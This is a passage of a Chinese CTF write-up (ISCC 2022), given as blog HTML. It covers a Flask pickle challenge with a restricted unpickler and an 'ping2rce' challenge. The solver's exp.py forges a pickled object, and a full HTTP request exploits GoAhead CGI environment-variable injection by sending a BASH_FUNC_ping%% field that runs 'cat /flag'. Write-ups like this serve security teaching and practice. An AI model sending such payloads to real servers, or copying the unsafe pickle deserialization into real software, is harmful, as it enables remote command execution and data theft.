class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>other<span class=\"token punctuation\">)</span> <span class=\"token keyword\">is</span> register <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> other<span class=\"token punctuation\">.</span>name <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">==</span> other<span class=\"token punctuation\">.</span>password\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">RestrictedUnpickler</span><span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>Unpickler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">find_class</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> module<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> module<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">[</span><span class=\"token string\">'__main__'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">raise</span> pickle<span class=\"token punctuation\">.</span>UnpicklingError<span class=\"token punctuation\">(</span><span class=\"token string\">\"global '%s.%s' is forbidden\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>module<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">find</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> RestrictedUnpickler<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>BytesIO<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/therealflag'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">realflag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            data <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'melody'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string\">b'R'</span> <span class=\"token keyword\">in</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token string\">'no reduce'</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                result <span class=\"token operator\">=</span> find<span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> register<span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">return</span> <span class=\"token string\">'The type is not correct!'</span>\n            correct <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>result <span class=\"token operator\">==</span> register<span class=\"token punctuation\">(</span>melody<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>melody<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>result <span class=\"token operator\">==</span> register<span class=\"token punctuation\">(</span><span class=\"token string\">\"melody\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"hug\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> correct<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'admin'</span><span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">return</span> Response<span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">(</span><span class=\"token string\">'./flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">return</span> Response<span class=\"token punctuation\">(</span><span class=\"token string\">\"You're not admin!\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> Response<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    test <span class=\"token operator\">=</span> register<span class=\"token punctuation\">(</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'123456'</span><span class=\"token punctuation\">)</span>\n    data <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> Response<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\n</code></pre>\n<p>看下逻辑，在therealflag路由下，使用用户melody，密码hug注册就会返回flag</p>\n<p>这里还需要对内容序列化，R操作码被ban了</p>\n<pre><code class=\"prism language-python\"><span class=\"token comment\">#!/usr/bin/python3</span>\n<span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n<span class=\"token comment\"># @Time    : 2022/5/4 19:40</span>\n<span class=\"token comment\"># @Author  : ki10Moc</span>\n<span class=\"token comment\"># @FileName: exp.py</span>\n<span class=\"token comment\"># @Software: PyCharm</span>\n<span class=\"token comment\"># Link: ki10.top</span>\n<span class=\"token keyword\">import</span> pickle\n<span class=\"token keyword\">import</span> base64\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">register</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name\n        self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> password\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__eq__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> other<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>other<span class=\"token punctuation\">)</span> <span class=\"token keyword\">is</span> register <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> other<span class=\"token punctuation\">.</span>name <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">==</span> other<span class=\"token punctuation\">.</span>password\n\nresult <span class=\"token operator\">=</span> register<span class=\"token punctuation\">(</span><span class=\"token string\">\"melody\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"hug\"</span><span class=\"token punctuation\">)</span>\na <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p>melody传参，在therealflag路由下操作即可</p>\n<p>ISCC{2022_melody_secrets}</p>\n<h3><a id=\"ping2rce_1193\"></a><strong>ping2rce</strong></h3>\n<p>寒假看到P牛发的GoAhead的PDF，当时就瞟了一眼，然后坐牢半天，早知道当时就好好复现了呜呜呜</p>\n<p><a href=\"https://tttang.com/archive/1399/\">GoAhead环境变量注入复现踩坑记 - 跳跳糖 (tttang.com)</a></p>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-NOn3kXtD-1654502690071)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8aa845cc-59e6-483d-8b4e-54abb8b9c6b5/Untitled.png)]\" src=\"image\\0a005569b1104ddc967a46176cfcf4fe.png\"/></p>\n<p>只需要这两个部分替换，发送一个multipart数据包，通过表单来注入环境变量</p>\n<pre><code class=\"prism language-php\"><span class=\"token constant\">POST</span> <span class=\"token operator\">/</span>cgi<span class=\"token operator\">-</span>bin<span class=\"token operator\">/</span>ping<span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span><span class=\"token number\">0.0</span><span class=\"token number\">.0</span><span class=\"token number\">.0</span> <span class=\"token constant\">HTTP</span><span class=\"token operator\">/</span><span class=\"token number\">1.1</span>\nHost<span class=\"token punctuation\">:</span> <span class=\"token number\">59.110</span><span class=\"token number\">.159</span><span class=\"token number\">.206</span><span class=\"token punctuation\">:</span><span class=\"token number\">8010</span>\nUpgrade<span class=\"token operator\">-</span>Insecure<span class=\"token operator\">-</span>Requests<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span>\nUser<span class=\"token operator\">-</span>Agent<span class=\"token punctuation\">:</span> Mozilla<span class=\"token operator\">/</span><span class=\"token number\">5.0</span> <span class=\"token punctuation\">(</span>Windows <span class=\"token constant\">NT</span> <span class=\"token number\">10.0</span><span class=\"token punctuation\">;</span> Win64<span class=\"token punctuation\">;</span> x64<span class=\"token punctuation\">)</span> AppleWebKit<span class=\"token operator\">/</span><span class=\"token number\">537.36</span> <span class=\"token punctuation\">(</span><span class=\"token constant\">KHTML</span><span class=\"token punctuation\">,</span> like Gecko<span class=\"token punctuation\">)</span> Chrome<span class=\"token operator\">/</span><span class=\"token number\">101.0</span><span class=\"token number\">.4951</span><span class=\"token number\">.54</span> Safari<span class=\"token operator\">/</span><span class=\"token number\">537.36</span>\nAccept<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span>html<span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>xhtml<span class=\"token operator\">+</span>xml<span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>xml<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span><span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>avif<span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>webp<span class=\"token punctuation\">,</span>image<span class=\"token operator\">/</span>apng<span class=\"token punctuation\">,</span><span class=\"token operator\">*</span><span class=\"token operator\">/</span><span class=\"token operator\">*</span><span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.8</span><span class=\"token punctuation\">,</span>application<span class=\"token operator\">/</span>signed<span class=\"token operator\">-</span>exchange<span class=\"token punctuation\">;</span>v<span class=\"token operator\">=</span>b3<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span>\nAccept<span class=\"token operator\">-</span>Encoding<span class=\"token punctuation\">:</span> gzip<span class=\"token punctuation\">,</span> deflate\nAccept<span class=\"token operator\">-</span>Language<span class=\"token punctuation\">:</span> zh<span class=\"token operator\">-</span><span class=\"token constant\">CN</span><span class=\"token punctuation\">,</span>zh<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.9</span><span class=\"token punctuation\">,</span>en<span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.8</span><span class=\"token punctuation\">,</span>zh<span class=\"token operator\">-</span><span class=\"token constant\">TW</span><span class=\"token punctuation\">;</span>q<span class=\"token operator\">=</span><span class=\"token number\">0.7</span>\nConnection<span class=\"token punctuation\">:</span> close\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> multipart<span class=\"token operator\">/</span>form<span class=\"token operator\">-</span>data<span class=\"token punctuation\">;</span> boundary<span class=\"token operator\">=</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span>WebKitFormBoundarylNDKbe0ngCGdEiPM\nContent<span class=\"token operator\">-</span>Length<span class=\"token punctuation\">:</span> <span class=\"token number\">190</span>\n\n<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span>WebKitFormBoundarylNDKbe0ngCGdEiPM\nContent<span class=\"token operator\">-</span>Disposition<span class=\"token punctuation\">:</span> form<span class=\"token operator\">-</span>data<span class=\"token punctuation\">;</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"BASH_FUNC_ping%%\"</span>\nContent<span class=\"token operator\">-</span>Type<span class=\"token punctuation\">:</span> text<span class=\"token operator\">/</span><span class=\"token function\">plain</span>\n\n<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> cat <span class=\"token operator\">/</span>flag<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\n<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span>WebKitFormBoundarylNDKbe0ngCGdEiPM<span class=\"token operator\">--</span>\n</code></pre>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-NzYqACRX-1654502690072)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c377ed70-c76a-45d8-9202-df5702fd9363/Untitled.png)]\" src=\"image\\52ca1fe51e20409b9d7b24aad0c8a276.png\"/></p>\n<p>ISCC{c1522169-7dcvd499-4add960-9ad36-8b2a5f2f7}</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}